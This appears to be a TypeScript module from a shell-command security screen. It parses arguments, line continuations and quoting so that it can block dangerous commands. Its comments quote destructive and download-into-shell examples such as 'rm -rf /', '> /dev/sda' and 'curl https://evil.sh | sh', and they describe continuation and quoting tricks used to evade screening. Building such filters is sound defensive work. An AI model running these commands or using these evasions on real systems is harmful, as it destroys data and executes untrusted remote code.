import {
  COMMAND_WRAPPERS,
  commandBasename,
  type ParsedShell,
  type SimpleCommand,
} from '../shell-parse.js';
import { osFold } from '../../os-fold.js';
import {
  COMMAND_CARRIERS,
  FALLBACK_REDIRECTS,
  INTERPRETERS,
  OPERATOR_SPLIT,
  SHELLS,
} from './constants.js';

/**
 * Shell-text handling for the screen (M-8 split of command-screen.ts).
 * `export` here means "used by the screen engine", not public API.
 */

/**
 * argv split into flags and operands, honouring a bare `--` end-of-options.
 *
 * `valueOptions` names the spellings that consume the NEXT word. Omitting it
 * reproduces the previous behaviour exactly, so every caller that does not know
 * a verb's arity is unaffected.
 */
export function splitArgs(
  args: string[],
  valueOptions?: readonly string[],
): { flags: string[]; operands: string[] } {
  const flags: string[] = [];
  const operands: string[] = [];
  let optionsEnded = false;
  let skipNext = false;
  for (const a of args) {
    if (skipNext) {
      skipNext = false;
      continue;
    }
    if (!optionsEnded && a === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && a.startsWith('-') && a.length > 1) {
      flags.push(a);
      // an attached value (`--file=X`) is self-contained and consumes nothing
      if (valueOptions?.includes(a) && !a.includes('=')) skipNext = true;
    } else operands.push(a);
  }
  return { flags, operands };
}

/**
 * F-21 - DID THE PARSE LOSE A WORD BOUNDARY TO A BRACE?
 *
 * Derived from the parser's OWN lexing rather than from a second copy of its
 * quoting rules: `{` and `}` are entries in `SHELL_OPERATORS`, so when either
 * reaches `terminator`/`strayOperators` the parse has split a word the shell
 * would not have split. That is the precise condition under which the primary
 * screen is brace-blind, and it covers every way an expansion can fail to
 * repair it - the range bound, the reading budget, a non-finite endpoint, a
 * group the shell does not expand at all (`{R}`, `{=..=}`), and an unmatched
 * `{` - rather than only the two bounds the filings happened to name.
 */
export function braceLost(p: ParsedShell): boolean {
  for (const c of p.commands) if (c.terminator === '{' || c.terminator === '}') return true;
  for (const o of p.strayOperators) if (o === '{' || o === '}') return true;
  return false;
}

/*
 * R-CLI-2 - THERE IS DELIBERATELY NO BOUND HERE ANY MORE, AND THE REASON IS
 * A MEASUREMENT RATHER THAN A PREFERENCE.
 *
 * A `MAX_CONTINUATION_TAILS = 16` used to sit here and `break` the loop below on
 * the sixteenth pair. That is an EXCLUSION wearing a bound's name: pairs 17 and
 * beyond were never read, so about ninety bytes of inert padding in front of a
 * payload made the restoration miss it entirely. Measured on the shipped
 * artifacts, the cliff sat EXACTLY at the constant - 0 of 480 cells open at 0, 8,
 * 14 and 15 pairs, and 600 of 600 open at 16, 17, 24, 40 and 64.
 *
 * THREE REPLACEMENTS WERE PRICED OVER ONE POPULATION OF 8,053 CELLS, IN BOTH
 * DIRECTIONS:
 *
 * raise it to 256              still fails OPEN above 256 - 5 cells
 * fail closed by REFUSING      bounded cost, but it REMOVES A CAPABILITY:
 * 3 benign long commands at 256, and 16 at 16
 * fall back to the raw-text
 * conservative reading       closes NOTHING - the download-into-shell rule
 * scans forward for a `|` stage, and in that
 * reading the downloader-headed SUFFIX is emitted
 * after the shell PRIMARY, so they never pair
 * remove it                 ZERO under-blocks and ZERO over-blocks
 *
 * AND THE BOUND IS NOT REPLACED BY A LARGER BOUND BECAUSE STANDING RULE 2 IS
 * ABOUT CAPABILITY, NOT SPEED. Any bound that refuses above itself refuses some
 * benign command; removing it refuses none. The price is time, and the time was
 * measured on built artifacts rather than assumed:
 *
 * continuation pairs      64      256     1,024     4,096
 * this code            0.8 ms   7.5 ms    95 ms    1,319 ms
 * an ordinary long
 * benign command     3.4 ms    56 ms   886 ms   14,294 ms
 *
 * A CENSUS SAYS WHAT "REALISTIC" IS, WHICH IS WHAT R-CLI-1's SOFT SPOT S5 ASKED
 * FOR (*"the tail bound is 16, chosen not derived"*): over 1,318 files in this
 * repository there are 176 multi-line commands and the MAXIMUM is SEVEN
 * continuation pairs - none above eight. At any count within an order of
 * magnitude of real work this loop costs under four milliseconds.
 *
 * The screen is ALREADY superlinear on inputs that long for reasons unrelated
 * to this loop - the same 4,096-pair benign command cost 914 ms before this
 * change - so the superlinearity is a pre-existing property this widens rather
 * than creates. It is filed, not fixed here.
 */

/**
 * R-CLI-4 - IS THIS TAIL A WHOLE COMMAND, OR A SLICE OF ONE?
 *
 * The restoration below is gated on the tail parsing to MORE THAN ONE command,
 * and that gate's entire correctness is that a one-command tail has all its
 * danger in a verb the join destroys. A tail cut at a pair INSIDE a substitution
 * carries the enclosing construct's own closer - `rm -rf /) docs/` - and that
 * punctuation ALONE raises the parsed command count above one, so the gate passed
 * on tails whose danger the join really does destroy. Measured: 203 cells of
 * ordinary prose refused for that reason, proved inert by execution in a fence
 * where the marker standing in for the destructive verb never fires.
 *
 * This asks only about punctuation, so it can be answered exactly. A tail whose
 * brackets or quotes do not balance is a SLICE of a command rather than a command,
 * and its command count is a fact about where the cut fell.
 *
 * The CLASS - any predicate computed over a substring carrying punctuation whose
 * partner is outside it - is , and it is swept at this site only.
 */
export function balancedTail(tail: string): boolean {
  let round = 0;
  let sq = false;
  let dq = false;
  for (let i = 0; i < tail.length; i += 1) {
    const c = tail[i];
    if (c === '\\') { i += 1; continue; }
    if (sq) { if (c === "'") sq = false; continue; }
    if (dq) { if (c === '"') dq = false; continue; }
    if (c === "'") { sq = true; continue; }
    if (c === '"') { dq = true; continue; }
    if (c === '(') { round += 1; continue; }
    if (c === ')') { round -= 1; if (round < 0) return false; continue; }
  }
  return round === 0 && !sq && !dq;
}

/**
 * - THE TEXT AFTER EACH LINE CONTINUATION, WHICH IS THE ONE
 * READING THE JOIN DESTROYS.
 *
 * A `\`+LF pair is removed by the shell, which glues the previous line's last
 * partial word onto the next line's FIRST TOKEN: `echo a\`+LF+`rm -rf /` runs
 * `echo arm -rf /`. That corruption is why this whole shape is excused, and the
 * excuse is CORRECT - for a payload whose danger IS that first token, the verb
 * really is destroyed and nothing dangerous runs.
 *
 * BUT THE GLUE CORRUPTS EXACTLY ONE TOKEN. Measured in a real `/bin/sh`
 * over every carrier spelling: behind the glue a PIPELINE's later stage still
 * runs, a COMMAND-LIST's later command still runs, a COMMAND SUBSTITUTION still
 * runs, and a REDIRECTION is still performed - while the payload's first token
 * never executes. So a payload whose danger lives anywhere but its first token
 * survives the excuse, and `curl … | sh` is exactly that: `curl` becomes
 * `acurl`, and `| sh` is untouched.
 *
 * Measured against the published 0.6.0 at the shipped artifacts: **1,200 cells
 * the published artifact REFUSES and this tree PERMITTED**, across 3 downloaders
 * x 8 interpreters x bare/`sudo` x 4 pipe spellings x 2 verb spellings x 5
 * carrier prefixes.
 *
 * R-CLI-2 - THE SHELL HAS FIVE QUOTING CONSTRUCTS AND THIS FUNCTION USED TO
 * READ ONE. Measured in real shells, cell by cell, rather than argued - *does a second program actually run behind
 * the pair?*
 *
 * context        the pair is …                        second program runs?
 * unquoted       REMOVED, words GLUED                  YES
 * '…'            LITERAL, no join                      no
 * "…"            REMOVED, string stays ONE argument     no
 * $'…'           LITERAL                               no
 * $"…"           REMOVED, string stays ONE argument     no
 * `\\`+LF        an ESCAPED backslash, then a real
 * newline - a genuine new command        YES, and correctly so
 *
 * So the restoration must be suppressed in **all four quoted constructs**. The
 * single-state version suppressed `'…'` deliberately and `$'…'` BY ACCIDENT (its
 * naive `'` toggle fires on the `'` of `$'`), and was wrong in the other two -
 * which cost, measured on the shipped artifacts, **576 CAPABILITY REMOVALS**:
 * ordinary prose in a quoted string that the published `0.6.0` permits and this
 * tree refused, at the one control a user cannot override.
 *
 * AND IT FAILED IN THE OTHER DIRECTION ON THE SAME BUG. A `'` is literal to
 * the shell inside `"…"`, inside `$"…"`, and when backslash-escaped - and an ODD
 * number of them anywhere before a pair flipped the single state variable, so
 * every later pair was skipped and the restoration never ran. **720 of 720 cells
 * open, against a control of 0 of 720 with an EVEN count.** The shell was driven
 * with 0, 1, 2 and 3 apostrophes and runs the second program in all four: *the
 * parity was an artifact of this scanner and of nothing else.*
 *
 * `joinContinuations` states the same single-quote rule, and the parity
 * control is asserted against this host's `/bin/sh` in the differential rather
 * than assumed here.
 *
 * `\`+CR+LF is deliberately NOT matched:  measured that no shell
 * removes that three-byte run, so it is a different class and treating it as a
 * continuation would re-open the defect that filing closed.
 */
export function continuationTails(command: string): string[] {
  const out: string[] = [];
  // THREE STATES, NOT ONE. `unquoted` → the pair is REMOVED and the words
  // are GLUED, which is the only reading this function exists to produce;
  // `'…'` and `"…"` → no join the restoration may act on. The backslash
  // escape is consumed in the unquoted and double-quoted states, so a `\'`
  // cannot open a span and a `\\`+LF is not mistaken for a `\`+LF.
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < command.length; i += 1) {
    const c = command[i] as string;
    if (quote === "'") {
      // Inside `'…'` NOTHING is special - not even a backslash.
      if (c === "'") quote = null;
      continue;
    }
    if (quote === '"') {
      // Inside `"…"` a backslash escapes the next character, INCLUDING a
      // newline - which POSIX removes while the string stays ONE argument, so
      // nothing new becomes a command and there is nothing to restore.
      if (c === '\\' && i + 1 < command.length) {
        i += 1;
        continue;
      }
      if (c === '"') quote = null;
      continue;
    }
    if (c === '\\' && command[i + 1] === '\n') {
      out.push(command.slice(i + 2));
      continue;
    }
    // Any OTHER backslash escapes the next character, so `\'` and `\"` are
    // literal and must not change the quoting state.
    if (c === '\\') {
      i += 1;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      continue;
    }
  }
  return out;
}

/**
 * R-CLI-4 - DOES ANY WORD IN THIS TEXT NAME SOMETHING THAT EXECUTES ITS
 * OPERANDS? The text-level twin of `headMayExecOperands`, asked of the whole
 * command rather than of one parsed argv, because the conservative reading runs
 * where there is no trustworthy argv to ask about.
 *
 * R-CLI-5 - THE DOC COMMENT THAT STOOD HERE BELONGED TO
 * `conservativeCommands` AND HAS BEEN PUT BACK. Inserting this function
 * immediately before its neighbour left an existing block describing a function
 * that returns candidate `SimpleCommand[]` sitting in front of a boolean
 * predicate about wrapper names. Two such drifts were caught by the batch that
 * caused them; this was the third, and it survived a full review. A mechanical
 * drift detector now runs over this batch's own diff.
 */
function textMayExecOperands(command: string): boolean {
  for (const w of command.split(/[\s;|&<>()`]+/)) {
    if (w.length === 0) continue;
    const n = osFold(commandBasename(w.replace(/['"\\]/g, '')));
    if (COMMAND_WRAPPERS.has(n) || COMMAND_CARRIERS.has(n) || INTERPRETERS.has(n) || SHELLS.has(n)) return true;
  }
  return false;
}

/**
 * R-CLI-4 - apply the shell's OWN continuation rule before the conservative
 * reading splits. Outside single quotes POSIX REMOVES a `\`+LF and GLUES the
 * words either side; this reading stripped the backslash and then split on the
 * newline, manufacturing a second command the shell never produces.
 */
function glueContinuations(command: string): string {
  let out = '';
  let sq = false;
  for (let i = 0; i < command.length; i += 1) {
    const c = command[i] as string;
    if (sq) { out += c; if (c === "'") sq = false; continue; }
    if (c === "'") { sq = true; out += c; continue; }
    // R-CLI-5 - THE ESCAPE-CONSUMPTION RULE ITS TWO SIBLING
    // READERS ALREADY HAVE. POSIX removes a backslash-newline pair; it does NOT
    // remove one whose backslash is itself escaped. `a\\`+LF is a LITERAL
    // backslash followed by a REAL newline, and the command after it runs - on
    // `/bin/sh`, `/bin/bash`, `/bin/zsh` and `/bin/dash`, measured with an inert
    // marker at the verb position. Without this rule the pair was deleted and a
    // live second program was welded into one nonexistent word.
    if (c === '\\' && command[i + 1] === '\\') { out += c; out += command[i + 1] as string; i += 1; continue; }
    if (c === '\\' && command[i + 1] === '\n') { i += 1; continue; }
    out += c;
  }
  return out;
}

/**
 * F-2c-25 - WHAT "FAIL CLOSED" MEANS FOR AN INPUT THE PARSER CANNOT READ.
 *
 * The module header promises that an unconfident parse is handed to "a
 * conservative screen". It was not one. It built ONE SimpleCommand from all the
 * whitespace tokens, and `screenCommands` keys every rule on `words[0]` - so
 * exactly one token, the first, was ever tested as a command. For
 * `echo $(…) ; rm -rf /` that token is `echo`, and **14 of the screen's 15
 * rules were skipped by a prefix that reads as an innocuous line**. The
 * published 0.6.0 blocked all fourteen.
 *
 * THE DEFINITION, stated so it can be argued with: when the parse cannot be
 * trusted, WE DO NOT KNOW WHICH TOKEN IS THE COMMAND. So every token is treated
 * as one - the text is split on the same `SHELL_OPERATORS` table the parser
 * uses, and within each segment EVERY SUFFIX is screened as a candidate argv.
 *
 * R-CLI-5 - THE TWO PARAMETERS ARE TWO DIFFERENT DECISIONS, AND CONFLATING
 * THEM WAS .
 *
 * `glue`     - apply the shell's own continuation rule before splitting. True
 * whenever the text may contain a construct this reader is not
 * modelling, INCLUDING at the top level past the substitution
 * bound, because the shell resolves those pairs regardless.
 * `suppress` - drop the invented candidate-suffix readings, because a word
 * here may be a MENTION rather than a command. True ONLY inside a
 * substitution interior. A command beside an over-deep construct
 * is not inside one.
 */
export function conservativeCommands(command: string, glue = false, suppress = glue): SimpleCommand[] {
  // `split` with a capturing group keeps the operators: [seg, op, seg, op, …].
  const parts = (glue ? glueContinuations(command) : command).split(OPERATOR_SPLIT);
  const segments: string[][] = [];
  const operators: (string | null)[] = [];
  for (let k = 0; k < parts.length; k += 2) {
    // The parse failed, so quote-removal never happened. Stripping quote and
    // escape characters here is the conservative reading - it can only make
    // MORE tokens look like a command word, never fewer (`"rm"` → `rm`).
    segments.push(
      (parts[k] as string)
        .split(/\s+/)
        .filter((w) => w.length > 0)
        .map((w) => w.replace(/['"\\]/g, ''))
        .filter((w) => w.length > 0),
    );
    operators.push((parts[k + 1] as string | undefined) ?? null);
  }

  const word = (v: string): { value: string; raw: string; quoted: boolean } => ({ value: v, raw: v, quoted: false });
  const primary: SimpleCommand[] = [];
  const suffixes: SimpleCommand[] = [];
  for (let k = 0; k < segments.length; k += 1) {
    const tokens = segments[k] as string[];
    const op = operators[k] ?? null;
    // A redirection operator makes the FIRST token of the next segment its
    // target, exactly as the parser treats it - otherwise `> /dev/sda` behind a
    // malformed prefix would have no target to screen.
    const nextFirst = (segments[k + 1] ?? [])[0];
    const redirects = op !== null && FALLBACK_REDIRECTS.has(op) && nextFirst !== undefined ? [word(nextFirst)] : [];
    primary.push({ assignments: [], words: tokens.map(word), redirects, redirectOps: [], terminator: op });
  }
  // Every OTHER token is a candidate command word too. These are emitted
  // AFTER all the primaries so that adjacency-sensitive rules (a download
  // piped into a shell) still see the real sequence.
  //
  // F-2c-40 - AND EACH SUFFIX KEEPS ITS SEGMENT'S TERMINATOR AND THE STAGES
  // AFTER IT. It did not: every suffix was emitted with `terminator: null`, so
  // the ONE rule that reads more than a single command - a network download
  // piped into a shell - could never fire on a candidate reading. **This is
  // exactly the defect F-2c-30 measured and closed in the carrier arm** ("24 of
  // the 988 shapes survived, and all 24 were `<carrier> curl https://evil.sh |
  // sh`"), left standing at the second site that builds candidate tokenizations.
  //
  // It was found by measurement, not by reading: after F-2c-40's depth
  // overflow began routing deep payloads here, **9 shapes still escaped the
  // floor and all 9 were the download-into-a-shell cores.** The same class, the
  // same fix, one site over - which is the arc's governing pattern arriving in
  // this file.
  //
  // The downstream stages are appended ONLY behind a pipe, because `|` is the
  // only operator any rule reads across. That keeps the candidate list linear in
  // ordinary input instead of quadratic in the number of segments.
  for (let k = 0; k < segments.length; k += 1) {
    const tokens = segments[k] as string[];
    const op = operators[k] ?? null;
    for (let start = 1; start < tokens.length; start += 1) {
      suffixes.push({
        assignments: [],
        words: tokens.slice(start).map(word),
        redirects: [],
        redirectOps: [],
        terminator: op,
      });
      if (op === '|') suffixes.push(...primary.slice(k + 1));
    }
  }
  return suppress && !textMayExecOperands(command) ? primary : [...primary, ...suffixes];
}
